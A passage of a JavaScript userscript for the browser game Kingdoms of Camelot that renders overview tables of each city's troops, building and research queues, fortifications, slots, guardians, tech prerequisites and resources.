		_displayrow (""+culang.swordsman+"",     infoRows[10]);
		_displayrow (""+culang.archer+"",        infoRows[11]);
		_displayrow (""+culang.cavalry+"",       infoRows[12]);
		_displayrow (""+culang.heavycavalry+"", infoRows[13]);
		_displayrow (""+culang.supplywagon+"",  infoRows[14]);
		_displayrow (""+culang.ballista+"",      infoRows[15]);
		_displayrow (""+culang.batteringram+"", infoRows[16]);
		_displayrow (""+culang.catapult+"",      infoRows[17]);
		m += "</TABLE>";
	      t.Overv.innerHTML = m;

		},      

showBuilds : function (){
    var t = Tabs.OverView;
    clearTimeout (t.displayTimer);
    t.Overv.innerHTML =null;
    t.Overv.style.maxHeight = '500px';
    t.Overv.style.overflowY = 'scroll';	
    var wall=0;
    var blacksmith=0;
    var fletching=0;
    var geometry = 0;
    var metalalloys = 0;
    var logging = 0;
    var poisonededge = 0;

    var FieldSpace = {1:13, 2:16, 3:19,  4:22, 5:25, 6:28, 7:31,  8:34,  9:37, 10:40, 11:40, 12:40};
    			  		   
    fertilizer = Seed.tech['tch1'];
    logging = Seed.tech['tch2'];
    stoneworking = Seed.tech['tch3'];
    mining = Seed.tech['tch4'];
    geometry = Seed.tech['tch5'];
    eagleeyes = Seed.tech['tch6'];
    poisonededge = Seed.tech['tch8'];
    metalalloys = Seed.tech['tch9'];
    featherweightpowder = Seed.tech['tch10'];
    magicalmapping = Seed.tech['tch11'];
    alloyhorseshoes = Seed.tech['tch12'];
    fletching = Seed.tech['tch13'];
    shrinkingpowder = Seed.tech['tch14'];
    healingpotions = Seed.tech['tch15'];
    giantsstrength = Seed.tech['tch16'];			  		       
    
    var m = '<DIV class=pdxStat>'+culang.HbuildResearch+'</div><DIV id=BuildsDiv style="font-size:12px"><TABLE cellpadding=5 cellspacing=0 border="1" style="border: 1px solid; border-style: none none none none;"><TR valign=top align=right>';
    m += "<TD align=left width=85 style='background-color:"+Colors.OverviewDarkRow+";'><INPUT id=showReq type=checkbox " + (t.showReq?'CHECKED ':'') +">"+culang.need+"</td>";
    for(i=0; i<Cities.numCities; i++) {
      m += "<TD width=79 style='background-color:"+Colors.OverviewDarkRow+"'><B>"+ Cities.cities[i].name.substring(0,11) +"</b><BR>"+ pdxkoordlink(Cities.cities[i].x, Cities.cities[i].y) +"<BR></td>";
    }
    m+='<TR valign=top align=right><TD width=85 style="background-color:'+Colors.OverviewDarkRow+';"><b>'+culang.building+'</b></td>';	
    for(i=0; i<Seed.cities.length; i++) {
    	city = 'city'+Seed.cities[i][0];
    	m+='<TD width=79 style="background:#FFFFFF">';
    	if (Seed.queue_con[city][0] != undefined) {
    		m+=uW.buildingcost['bdg' + Seed.queue_con[city][0][0]][0];
    		m+=' ('+Seed.queue_con[city][0][1]+')';
    		m+='<br>'+ timestr((Seed.queue_con[city][0][4] - unixTime()),true);
    	}
    	m+='</td>';	
    }
    m+='</tr>';
    m+='<TR valign=top align=right><TD width=85 style="background-color:'+Colors.OverviewDarkRow+';"><b>'+culang.research+'</b></td>';	
    for(i=0; i<Seed.cities.length; i++) {
    	city = 'city'+Seed.cities[i][0];
    	m+='<TD width=79 style="background:#FFFFFF">';
    	if (Seed.queue_tch[city][0] != undefined) {
    		m+=uW.techcost['tch' + Seed.queue_tch[city][0][0]][0];
    		m+=' ('+Seed.queue_tch[city][0][1]+')';
    		m+='<br>'+ timestr((Seed.queue_tch[city][0][3] - unixTime()),true);
    	}
    	m+='</td>';		
    }
    m+='</tr><TR><TD colspan="8" style="background: #FFFFFF; border:none">&nbsp;</td></tr>';
    m+='<TR valign=top align=right><TD width=85 style="background-color:'+Colors.OverviewDarkRow+';">'+uW.fortcost['frt53'][0]+'</td>';
    for (i=0;i<Seed.cities.length;i++){
    	city = 'city'+Seed.cities[i][0];
    	for (y in Seed.buildings[city]) {
    		if (Seed.buildings[city][y][0] == 15) blacksmith = Seed.buildings[city][y][1]; 
    	}
    	wall = parseInt(Seed.buildings[city].pos1[1]);
		var WallSpace = 0;
		for (var b = 1; b < (wall + 1); b++) {WallSpace += (b * 1000)};
		max = WallSpace/2/4 - parseInt(Seed.fortifications[city]["fort53"]) - parseInt(Seed.fortifications[city]["fort55"]);
    	m+= '<TD width=79 style="background:#FFFFFF">' + Seed.fortifications[city]["fort53"];
    	if (wall >=6 && blacksmith >=6 && fletching >=5 && max > 0) m+= '<br>Left: ' + max +'</td>';
    	else if (t.showReq){
    			if (wall < 6) m+= '<br><FONT COLOR= "CC0000">'+culang.wall+': ' + wall + '(6)</font>';
    			if (blacksmith < 6) m+= '<br><FONT COLOR= "CC0000">'+culang.blacksmith+': ' + blacksmith + '(6)</font>';
    			if (fletching < 5) m+= '<br><FONT COLOR= "CC0000">'+culang.fletch+': ' + fletching + '(5)</font>';
    			m+='</td>';
    		} 		
    }
    m+='</tr><TR valign=top align=right><TD width=85 style="background-color:'+Colors.OverviewDarkRow+';">'+uW.fortcost['frt55'][0]+'</td>';
    for (i=0;i<Seed.cities.length;i++){
    	city = 'city'+Seed.cities[i][0];
    	for (y in Seed.buildings[city]) {
    		if (Seed.buildings[city][y][0] == 19) wall = Seed.buildings[city][y][1];
    		if (Seed.buildings[city][y][0] == 15) blacksmith = Seed.buildings[city][y][1]; 
    	}
    	max = WallSpace[wall]/2/4 - parseInt(Seed.fortifications[city]["fort53"]) - parseInt(Seed.fortifications[city]["fort55"]);
    	m+=  '<TD width=79 style="background:#FFFFFF">' +Seed.fortifications[city]["fort55"];
    	if (wall >=8 && blacksmith >=8 && fletching >=7 && geometry>=7 && max > 0) m+= '<br>Left: ' + max+'</td>';
    	else if (t.showReq){
    			if (wall < 8) m+= '<br><FONT COLOR= "CC0000">'+culang.wall+': ' + wall + '(8)</font>';
    			if (blacksmith < 8) m+= '<br><FONT COLOR= "CC0000">'+culang.blacksmith+': ' + blacksmith + '(8)</font>';
    			if (fletching < 7) m+= '<br><FONT COLOR= "CC0000">'+culang.fletch+': ' + fletching + '(7)</font>';
    			if (geometry < 7) m+= '<br><FONT COLOR= "CC0000">'+culang.geo+': ' + geometry + '(7)</font>';
    			m+='</td>';
    	} 	
    }
    m+='<TR valign=top align=right><TD width=85 style="background-color:'+Colors.OverviewDarkRow+';">'+culang.walldef+'</td>';
    for (i=0;i<Seed.cities.length;i++){
    	city = 'city'+Seed.cities[i][0];
    	wall = parseInt(Seed.buildings[city].pos1[1]);
    	build = (parseInt(Seed.fortifications[city]["fort53"])*2)+ (parseInt(Seed.fortifications[city]["fort55"])*4);
    	var WallSpace = 0;
		for (var b = 1; b < (wall + 1); b++) {WallSpace += (b * 1000)};
		max = WallSpace/2;
		if (build < max) m+='<TD width=79 style="background:#FFFFFF"><FONT COLOR= "CC0000">';
    	else m+='<TD width=79 style="background:#FFFFFF"><FONT COLOR= "669900">';
    	m+= build+'</font>';
    	m+= '/' + max +'</td>';
    }
    m+='</tr><TR valign=top align=right><TD width=85 style="background-color:'+Colors.OverviewDarkRow+';">'+uW.fortcost['frt60'][0]+'</td>';
    for (i=0;i<Seed.cities.length;i++){
    	city = 'city'+Seed.cities[i][0];
    	for (y in Seed.buildings[city]) {
    		if (Seed.buildings[city][y][0] == 15) blacksmith = Seed.buildings[city][y][1]; 
    	}
    	wall = parseInt(Seed.buildings[city].pos1[1]);
		var WallSpace = 0;
		for (var b = 1; b < (wall + 1); b++) {WallSpace += (b * 1000)};
		max = WallSpace/2/4 - (parseInt(Seed.fortifications[city]["fort60"])*4) - (parseInt(Seed.fortifications[city]["fort61"])*1) - (parseInt(Seed.fortifications[city]["fort62"])*3);
    	m+=  '<TD width=79 style="background:#FFFFFF">'+Seed.fortifications[city]["fort60"];
    	if (wall >=4 && blacksmith >=4 && poisonededge>=4 && max>0) m+= '<br>Left: ' + max+'</td>';
    	else if (t.showReq){
    			if (wall < 4) m+= '<br><FONT COLOR= "CC0000">'+culang.wall+': ' + wall + '(4)</font>';
    			if (blacksmith < 4) m+= '<br><FONT COLOR= "CC0000">BlackS.: ' + blacksmith + '(4)</font>';
    			if (poisonededge < 4) m+= '<br><FONT COLOR= "CC0000">Poison.: ' + poisonededge + '(4)</font>';
    			m+='</td>';
    	} 	
    }
    m+='</tr><TR valign=top align=right><TD width=85 style="background-color:'+Colors.OverviewDarkRow+';">'+uW.fortcost['frt61'][0]+'</td>';
    for (i=0;i<Seed.cities.length;i++){
    	city = 'city'+Seed.cities[i][0];
    	for (y in Seed.buildings[city]) {
    		if (Seed.buildings[city][y][0] == 15) blacksmith = Seed.buildings[city][y][1]; 
    	}
		wall = parseInt(Seed.buildings[city].pos1[1]);
		var WallSpace = 0;
		for (var b = 1; b < (wall + 1); b++) {WallSpace += (b * 1000)};
		max = WallSpace/2/1 - (parseInt(Seed.fortifications[city]["fort60"])*4) - (parseInt(Seed.fortifications[city]["fort61"])*1) - (parseInt(Seed.fortifications[city]["fort62"])*3);
    	m+= '<TD width=79 style="background:#FFFFFF">'+Seed.fortifications[city]["fort61"];
    	if (wall >=1 && metalalloys >=1 && max>0) m+= '<br>Left: ' + max+'</td>';
    	else if (t.showReq){
    			if (wall < 1) m+= '<br><FONT COLOR= "CC0000">Wall: ' + wall + '(1)</font>';
    			if (metalalloys < 1) m+= '<br><FONT COLOR= "CC0000">Metal.: ' + metalalloys + '(1)</font>';
    			m+='</td>';
    	} 	
    }
    m+='</tr><TR valign=top align=right><TD style="background-color:'+Colors.OverviewDarkRow+';">'+uW.fortcost['frt62'][0]+'</td>';
    for (i=0;i<Seed.cities.length;i++){
    	city = 'city'+Seed.cities[i][0];
    	for (y in Seed.buildings[city]) {
    		if (Seed.buildings[city][y][0] == 15) blacksmith = Seed.buildings[city][y][1]; 
    	}
		wall = parseInt(Seed.buildings[city].pos1[1]);
		var WallSpace = 0;
		for (var b = 1; b < (wall + 1); b++) {WallSpace += (b * 1000)};
		max = (WallSpace/2/3).toFixed(0) - (parseInt(Seed.fortifications[city]["fort60"])*4) - (parseInt(Seed.fortifications[city]["fort61"])*1) - (parseInt(Seed.fortifications[city]["fort62"])*3);
    	m+=  '<TD width=79 style="background:#FFFFFF">'+Seed.fortifications[city]["fort62"];
    	if (wall >=2 && blacksmith>=2 && logging>=2 && max>0) m+= '<br>Left: ' + max+'</td>';
    	else if (t.showReq){
    			if (wall < 2) m+= '<br><FONT COLOR= "CC0000">'+culang.wall+': ' + wall + '(2)</font>';
    			if (blacksmith < 2) m+= '<br><FONT COLOR= "CC0000">BlackS.: ' + blacksmith + '(2)</font>';
    			if (logging < 2) m+= '<br><FONT COLOR= "CC0000">Logg.: ' + logging + '(2)</font>';
    			m+='</td>';
    	} 	
    }
    m+='<TR valign=top align=right><TD width=85 style="background-color:'+Colors.OverviewDarkRow+';">'+culang.fielddefense+'</td>';
    for (i=0;i<Seed.cities.length;i++){
    	city = 'city'+Seed.cities[i][0];
    	wall = parseInt(Seed.buildings[city].pos1[1]);
    	build = (parseInt(Seed.fortifications[city]["fort60"])*4)+ (parseInt(Seed.fortifications[city]["fort61"])*1) + (parseInt(Seed.fortifications[city]["fort62"])*3);
    	var WallSpace = 0;
		for (var b = 1; b < (wall + 1); b++) {WallSpace += (b * 1000)};
		max = WallSpace/2;
    	if (build < max) m+='<TD width=79 style="background:#FFFFFF"><FONT COLOR= "CC0000">';
    	else m+='<TD width=79 style="background:#FFFFFF"><FONT COLOR= "669900">';
    	m+= build+'</font>';
    	m+= '/' + max +'</td>';
    }
    m+='</tr><TR><TD colspan="8" style="background: #FFFFFF; border:none">&nbsp;</td></tr>';
    m+='<TR valign=top align=right><TD width=85 style="background-color:'+Colors.OverviewDarkRow+';">'+culang.building+' '+culang.slots+'</td>';
    
    for(i=0; i<Seed.cities.length; i++) {
    	var count=0;
    	city = 'city'+Seed.cities[i][0];
    	for (y in Seed.buildings[city]) {
    		if (Seed.buildings[city][y][0] >=5 && Seed.buildings[city][y][0] <19) count++;
    	}
    	if (count == 31) m+='<TD width=79 style="background:#FFFFFF"><FONT COLOR= "669900">';
    	else m+='<TD width=79 style="background:#FFFFFF"><FONT COLOR= "CC0000">';
    	m+= count + '</font> (31)</td>';
    }
    m+='</tr>';
    m+='<TR valign=top align=right><TD width=85 style="background-color:'+Colors.OverviewDarkRow+';">'+culang.fieldslots+'</td>';
    
    for(i=0; i<Seed.cities.length; i++) {
    	var count=0;
    	var castle=0;
    	city = 'city'+Seed.cities[i][0];
    	for (y in Seed.buildings[city]) {
    		if (Seed.buildings[city][y][0] == 0) castle = Seed.buildings[city][y][1];
    		if (Seed.buildings[city][y][0] >=1 && Seed.buildings[city][y][0] <=4) count++;
    	}
    	if (count == FieldSpace[castle]) m+='<TD width=79 style="background:#FFFFFF"><FONT COLOR= "669900">';
    	else m+='<TD width=79 style="background:#FFFFFF"><FONT COLOR= "CC0000">';
    	m+= count + '</font> ('+FieldSpace[castle]+')</td>';
    }
    m+='</tr>';
    for (b=0;b<20;b++){
    	m+='<TR valign=top align=right><TD width=85 style="background-color:'+Colors.OverviewDarkRow+';">'+uW.buildingcost['bdg' + b][0]+'</td>';
        for (c=0;c<Seed.cities.length;c++){
        	m+='<TD style="width:79px; max-width:79px; word-wrap: break-word; background:#FFFFFF">';
        		city= 'city'+Seed.cities[c][0];
        		var count =0;
        		for (y in Seed.buildings[city]) {
        			if (Seed.buildings[city][y][0] == b) {
        				count++;
        				if (count > 1) m+=",";
        				if (Seed.buildings[city][y][1] >= 9) m+='<FONT COLOR= "669900">';
        				m+=Seed.buildings[city][y][1];
        				if (Seed.buildings[city][y][1] >= 9) m+='</font>';
        				
        			}
        		}
        		if (count == 0) {
        			m+='<FONT COLOR= "CC0000">0</font>';
        		}
        	m+='</td>';		
        }
        m+='</tr>';
    } 
    m+='</tr><TR><TD colspan="8" style="background: #FFFFFF; border:none">&nbsp;</td></tr>';
    for(i=0; i<Cities.numCities; i++) {
    }
    m+='<TR valign=top align=right><TD width=85 style="background-color:'+Colors.OverviewDarkRow+';">'+culang.guardians+'</td>';
    for(i=0; i<Seed.cities.length; i++) {
     	for(g=0;g<Seed.guardian.length;g++) {
     		if (Seed.guardian[g]['cityId'] == Seed.cities[i][0] && Seed.guardian[g]['level']!=0) {
     			m += '<TD width=79 style="background:#FFFFFF">';
     			if (Seed.guardian[g]['level'] >=9) m+='<FONT COLOR= "669900">'; 
     			m+=Seed.guardian[g]['level']+"("+Seed.guardian[g]['type']+")</td>";
     			if (Seed.guardian[g]['level'] >=9) m+='</font>'; 
     		}
     		else {if (Seed.guardian[g]['cityId'] == Seed.cities[i][0] && Seed.guardian[g]['level']==0) m += '<TD width=79 style="background:#FFFFFF"><FONT COLOR= "CC0000">0</font></td>'};
    	}
    }
    m+='</tr></table><BR></table><DIV class=pdxStat>'+culang.HResearchS+'</div><TABLE class=ptBuilds  border=1px cellpadding=2 cellspacing=0><TR valign=top align=left>';
	
    for (i in uW.techcost) {
    	m+='<TD border=1px style="width:150px; background:#FFFFFF">'+uW.techcost[i][0]+'</td><TD align=center style="width:50px max-width:150px; background:#FFFFFF;">';
    	if (Seed.tech[i] >=9) m+='<FONT COLOR= "669900">';
    	if (Seed.tech[i] ==0) m+='<FONT COLOR= "CC0000">';
    	m+=Seed.tech[i];
    	if (Seed.tech[i] >=9 || Seed.tech[i] ==0) m+='</font>';
    	if (t.showReq) {
    		for(z=0; z<Seed.cities.length; z++) {
        		city = 'city'+Seed.cities[z][0];
        		for (y in Seed.buildings[city]) {
        			var farm,sawmill,quarry,mine,alchemylab,workshop,blacksmith,stable,storehouse,barracks = 0;
        			if (Seed.buildings[city][y][0] == 1 && Seed.buildings[city][y][0] > farm) farm = Seed.buildings[city][y][1]; 
        			if (Seed.buildings[city][y][0] == 2 && Seed.buildings[city][y][0] > sawmill) sawmill = Seed.buildings[city][y][1];
        			if (Seed.buildings[city][y][0] == 3 && Seed.buildings[city][y][0] > quarry) quarry = Seed.buildings[city][y][1]; 
        			if (Seed.buildings[city][y][0] == 4 && Seed.buildings[city][y][0] > mine) mine = Seed.buildings[city][y][1];
        			if (Seed.buildings[city][y][0] == 9) storehouse = Seed.buildings[city][y][1];
        			if (Seed.buildings[city][y][0] == 11) alchemylab = Seed.buildings[city][y][1];
        			if (Seed.buildings[city][y][0] == 13 && Seed.buildings[city][y][0] > barracks) barracks = Seed.buildings[city][y][1];
        			if (Seed.buildings[city][y][0] == 15) blacksmith = Seed.buildings[city][y][1];
        			if (Seed.buildings[city][y][0] == 16) workshop = Seed.buildings[city][y][1];
        			if (Seed.buildings[city][y][0] == 17) stable = Seed.buildings[city][y][1];
        		}
        	}
        	m+='<FONT COLOR= "CC0000">';
    		switch (i) {
    			case '1': 
    				if (alchemylab < Seed.tech[i]) m+='<BR>'+culang.alchemylab+' '+ alchemylab+ '('+ (Seed.tech[i]) +')';
    				if (farm < Seed.tech[i]) m+='<BR>'+culang.farm+' '+ farm +'('+ (Seed.tech[i]+1) +')</td>';
    				break;
    			case '2': 
    				if (alchemylab < Seed.tech[i]) m+='<BR>'+culang.alchemylab+' '+ alchemylab+ '('+ (Seed.tech[i]) +')';
    				if (sawmill < Seed.tech[i]) m+='<BR>'+culang.sawmill+' '+ sawmill +'('+ (Seed.tech[i]) +')';
    				break;
    			case '3': 
    				if (alchemylab < Seed.tech[i]) m+='<BR>'+culang.alchemylab+' '+ alchemylab+ '('+ (Seed.tech[i]) +')';
    				if (quarry < Seed.tech[i]) m+='<BR>'+culang.quarry+' '+ quarry +'('+ (Seed.tech[i]) +')</td>';
    				break;
    			case '4': 
    				if (alchemylab < Seed.tech[i]) m+='<BR>'+culang.alchemylab+' '+ alchemylab+ '('+ (Seed.tech[i]) +')';
    				if (mine < Seed.tech[i]) m+='<BR>Mine '+ mine +'('+ (Seed.tech[i]) +')';
    				break;
    			case '5': 
    				if (alchemylab < 3) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'(3)';
    				if (alchemylab >= 3 && alchemylab < Seed.tech[i]) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'('+ (Seed.tech[i]) +')';
    				if (workshop < Seed.tech[i]) m+='<BR>'+culang.workshop+' ' + workshop +'('+ (Seed.tech[i]) +')';
    				if (stoneworking < 2) m+='<BR>Stoneworking '+ stoneworking +'(2)';
    				break;
    			case '6': 
    				if (alchemylab < 3) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'(3)';
    				if (alchemylab >= 3 && alchemylab < Seed.tech[i]) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'('+ (Seed.tech[i]) +')';
    				break;	
    			case '8': 
    				if (alchemylab < 2) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'(2)';
    				if (alchemylab >= 2 && alchemylab < Seed.tech[i]) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'('+ (Seed.tech[i]) +')';
    				if (barracks < 2) m+='<BR>Barracks '+ barracks +'(2)';
    				break;		
    			case '9': 
    				if (alchemylab < 3) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'(3)';
    				if (alchemylab >= 3 && alchemylab < Seed.tech[i]) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'('+ (Seed.tech[i]) +')';
    				if (blacksmith < Seed.tech[i]) m+='<BR>Blacksmith '+ blacksmith+'('+ (Seed.tech[i]) +')';
    				if (mining < Seed.tech[i]) m+='<BR>Mining '+ mining +'('+ (Seed.tech[i]) +')';
    				break;
    			case '10': 
    				if (alchemylab < 4) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'(4)';
    				if (alchemylab >= 4 && alchemylab < Seed.tech[i]) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'('+ (Seed.tech[i]) +')';
    				break;
    			case '11': 
    				if (alchemylab < 4) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'(4)';
    				if (alchemylab >= 4 && alchemylab < Seed.tech[i]) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'('+ (Seed.tech[i]) +')';
    				break;
    			case '12': 
    				if (alchemylab < 5) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'(5)';
    				if (alchemylab >= 5 && alchemylab < Seed.tech[i]) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'('+ (Seed.tech[i]) +')';
    				if (stable < Seed.tech[i]) m+='<BR>'+culang.stable+' '+ stable +'('+ (Seed.tech[i]+1) +')';
    				if (metalalloys < Seed.tech[i]) m+='<BR>Metal Alloys '+ metalalloys +'('+ (Seed.tech[i]+1) +')';
    				break;
    			case '13': 
    				if (alchemylab < 4) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'(4)';
    				if (alchemylab >= 4 && alchemylab < Seed.tech[i]) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'('+ (Seed.tech[i]) +')';
    				if (logging < 4) m+='<BR>Logging '+ logging +'(4)';
    				break;
    			case '14': 
    				if (alchemylab < 6) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'(6)';
    				if (alchemylab >= 6 && alchemylab < Seed.tech[i]) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'('+ (Seed.tech[i]) +')';
    				if (storehouse < Seed.tech[i]) m+='<BR>'+culang.storehouse+' '+ storehouse +'('+ (Seed.tech[i]) +')';
    				if (logging < 3) m+='<BR>'+culang.logging+' '+ logging+'(3)';
    				break;
    			case '15': 
    				if (alchemylab < 6) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'(6)';
    				if (alchemylab >= 6 && alchemylab < Seed.tech[i]) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'('+ (Seed.tech[i]) +')';
    				if (featherweightpowder  < 3) m+='<BR>'+culang.featherweight+'  '+ featherweightpowder +'(3)';
    				break;
    			case '16': 
    				if (alchemylab < 5) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'(5)';
    				if (alchemylab >= 5 && alchemylab < Seed.tech[i]) m+='<BR>'+culang.alchemylab+' '+ alchemylab +'('+ (Seed.tech[i]) +')';
    				if (logging  < 5) m+='<BR>'+culang.logging+' '+ logging +'(5)';
    				if (geometry  < 2) m+='<BR>'+culang.geo+'  '+ geometry +'(2)';
    				break;
    		}
    		m+='</font>';
    	}
    	m+='</td></tr>';
    }	
    m+='</table></div>';
	
    t.Overv.innerHTML = m;
    document.getElementById('showReq').addEventListener ('change', function (){
    	t.showReq = document.getElementById('showReq').checked;
    	t.showBuilds();
    },false);	
    t.displayTimer = setTimeout (t.showBuilds, 1000);
  },
  // STANDARD STATS
  paintOld : function (){
	var rownum = 0;
	var t = Tabs.OverView;
	t.Overv.style.maxWidth = '100%';
	t.Overv.style.maxHeight = '1000px';
	t.Overv.style.overflowY = 'auto';

	clearTimeout (t.displayTimer);

	function _row (name, row, noTotal){
      if (rownum++ % 2)
        style = '';
      else
        style = ' style = "background: #e8e8e8"';
      var tot = 0;
      var m = [];
      m.push ('<TR style="background: #fff" align=right');
      m.push (style);
      m.push ('><TD');
      m.push (style);
      m.push ('><B>');
      m.push (name);
      m.push (' &nbsp; </td>');
      if (noTotal){
        m.push ('<TD');
        m.push (style);
        m.push ('> &nbsp;</td>');
      } else {
        for (i=0; i<row.length; i++)
          tot += parseInt(row[i]);
        m.push ('<TD style="background: #600000;color: #FFF">');
if (TEST_WIDE)
  m.push ('X,');        
        m.push (addCommas(tot));
        m.push ('</td>');
      }
      for (i=0; i<row.length; i++){
	   if (Options.showStatsStyle =="noborder") m.push ('<TD style="padding: 3px;"'); // noborder
       if (Options.showStatsStyle =="borderright")  m.push ('<TD style="padding: 3px; border-right: 1px solid #141516; "'); // includeBorderRight
       if (Options.showStatsStyle =="borderstyle") m.push ('<TD style="padding: 3px; border: 1px solid #141516;"'); // includeBorderStyle
	   if (Options.showStatsStyle =="borderrightleft") m.push ('<TD style="padding: 3px; border-right: 1px solid #141516; border-left: 1px solid #141516;"'); // includeBorderStyle
	   if (Options.showStatsStyle =="shadowbox") m.push ('<TD style="padding: 3px; -moz-box-shadow:inset 0px 0px 5px #000;"'); // includeShadowBox
	   if (Options.showStatsStyle =="inset") m.push ('<TD style="padding: 3px; border: 1px inset #333"'); // includeInset
        m.push (style);
        m.push ('>');
if (TEST_WIDE)
  m.push ('X,');        
        m.push (addCommas(row[i]));
        m.push ('</td>');
      }
      m.push ('</tr>');
      return m.join('');
    }
//DebugTimer.start();
    try {
	Tabs.Marches.getMarchCount(0);
      if (Options.includeMarching)
        march = getMarchInfo ();

      dt = new Date ();
      dt.setTime (Seed.player.datejoinUnixTime * 1000);
      
      str = '<DIV class=pdxStat>'+culang.HSacStats+'</div>';
      if (Options.includeIcons==true) str += "<DIV id=overMainDiv style='font-size:"+ Options.OverViewFontSize +"px'><TABLE cellpadding=0 cellspacing=0><TR valign=top align=right><TD width=65><img height=40 src=https://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/buildings/hover_states/Castle_lvl11_gen_26.png?4568 title="+culang.holyplace+"><br><span class=pdxCapShadowI>("+culang.coord+")<br>"+culang.province+"</td></span><TD width=88 style='background: #600000;color: #FFF'><span class=pdxCapShadow><center>"+culang.total+"</center></span></td>";
      if (Options.includeIcons==false) str += "<DIV id=overMainDiv style='font-size:"+ Options.OverViewFontSize +"px'><TABLE cellpadding=0 cellspacing=0><TR valign=top align=right><TD width=65>"+culang.holyplace+"<br><span class=pdxCapShadowI>("+culang.coord+")<br>"+culang.province+"</td></span><TD width=88 style='background: #600000;color: #FFF'><span class=pdxCapShadow><center>"+culang.total+"</center></span></td>";

	  var currentCityId = unsafeWindow.currentcityid;
      for(i=0; i<Cities.numCities; i++) {
        if (Cities.cities[i].id == currentCityId) {
          var button = '<center><INPUT id="idGotoCity_'+i+ '" disabled="disabled" type=submit value='+ Cities.cities[i].name.substring(0,11) +' /><BR>';
          str += '<TD width=81>'+button + pdxkoordlink(Cities.cities[i].x, Cities.cities[i].y) +"<BR>\
                 <span class=pdxCapShadow>"+ unsafeWindow.provincenames['p'+ Cities.cities[i].provId] +"</span></td></center>";
        } else {
          var button = '<center><INPUT id="idGotoCity_'+i+ '" type=submit value='+ Cities.cities[i].name.substring(0,11) +' /><BR>';
          str += '<TD width=81>'+button + pdxkoordlink(Cities.cities[i].x, Cities.cities[i].y) +"<BR>\
                 <span class=pdxCapShadow>"+ unsafeWindow.provincenames['p'+ Cities.cities[i].provId] +"</span></td></center>";
        }
      }
      if (Options.includeMarching)
            str += '<TD width=81><span class=pdxCapShadowRW>'+culang.marches+'</span></td>';
          str += "</tr>";
    	  str += '<tr align=center><TD style=\'background: #CCFFCC\' width=88 ><center><span class=pdxCapShadowRW>'+culang.def+'</span> </center>&nbsp;</td><TD style=\'background: #CCFFCC\' ></td>';
    	      for(i=0; i<Cities.numCities; i++) {
              var mode = Seed.citystats["city" + Cities.cities[i].id].gate;
              str+='<TD style=\'background: #CCFFCC\'><center><INPUT id="idToggleDef_'+i+ '" type=submit value='+((mode==1)?''+culang.buttonon+'':''+culang.buttonoff+'')+' /></INPUT></center></td>';
          }
  if (Options.includeWachturm) {
    str += '<TR><TD style=\'background: #CCFFCC\'><SPAN class=pdxCapShadowRW><center>'+culang.tower+'</center></span></td><TD style=\'background: #CCFFCC\'></td>';
    for(i=0; i<Cities.numCities; i++){
      cityID = 'city'+Cities.cities[i].id;
      Gate = parseInt(Seed.citystats[cityID].gate);
    if(Gate == 0)
      str += '<TD style=\'background: #CCFFCC\'><center><span class=pdxCapShadow>'+culang.hide+'</span></center></td>';
    else
      str += '<TD style=\'background: #CCFFCC\' ><center><SPAN class=pdxCapShadowRed><blink>'+culang.def+'</blink></span></center></td>';

    }
  }
    if (Options.includeMaersche) {
      str += '<tr><TD style=\'background: #CCFFCC\' width=88 ><span class=pdxCapShadowRW><center>'+culang.marches+'</center></span></td><TD style=\'background: #CCFFCC\' ></td>';
      for(i=0; i<Cities.numCities; i++) {
          str+='<TD style=\'background: #CCFFCC\'><center>'+Tabs.Marches.counts[i]+'</center></td>';
      }
      str += "</tr>";
  }

  	rows = [];
      rows[0] = [];
      for(i=0; i<Cities.numCities; i++) {
        cityID = 'city'+ Cities.cities[i].id;
        rows[0][i] = parseInt(Seed.citystats[cityID].gold[0]);
      }
      for (r=1; r<6; r++){
        rows[r] = [];
        for(i=0; i<Cities.numCities; i++) {
          cityID = 'city'+ Cities.cities[i].id;
		  	  if (r==5)
		  rows[r][i] = parseInt(Seed.resources[cityID]['rec'+r][0]);
		  else
          rows[r][i] = parseInt(Seed.resources[cityID]['rec'+r][0] / 3600);
        }
      }
  
    if (Options.includeRessis) {


	     if (Options.includeMarching){
        for (var i=0; i<6; i++)
          rows[i][Cities.numCities] = march.resources[i];
      }

	if (Options.includeResIcons==true) str += _row ('<img height='+Options.ResIconSize+' title="'+culang.gold+'" src=http://koc.god-like.info/img/gold_30.png>', rows[0], false, 0);
	if (Options.includeResIcons==false)     str += _row (''+culang.gold+'', rows[0], false, 0);
	if (Options.includeResIcons==true) str += _row ('<img height='+Options.ResIconSize+' title="'+culang.food+'" src=http://koc.god-like.info/img/food_30.png>', rows[1], false, 0);
	if (Options.includeResIcons==false)    str += _row (''+culang.food+'', rows[1], false, 0);
	if (Options.includeResIcons==true) str += _row ('<img height='+Options.ResIconSize+' title="'+culang.wood+'" src=http://koc.god-like.info/img/wood_30.png>', rows[2], false, 0);
	if (Options.includeResIcons==false)    str += _row (''+culang.wood+'', rows[2], false, 0);
	if (Options.includeResIcons==true) str += _row ('<img height='+Options.ResIconSize+' title="'+culang.stone+'" src=http://koc.god-like.info/img/stone_30.png>', rows[3], false, 0);
	if (Options.includeResIcons==false)    str += _row (''+culang.stone+'', rows[3], false, 0);
	if (Options.includeResIcons==true) str += _row ('<img height='+Options.ResIconSize+' title="'+culang.ore+'" src=http://koc.god-like.info/img/iron_30.png>', rows[4], false, 0);
	if (Options.includeResIcons==false)    str += _row (''+culang.ore+'', rows[4], false, 0);
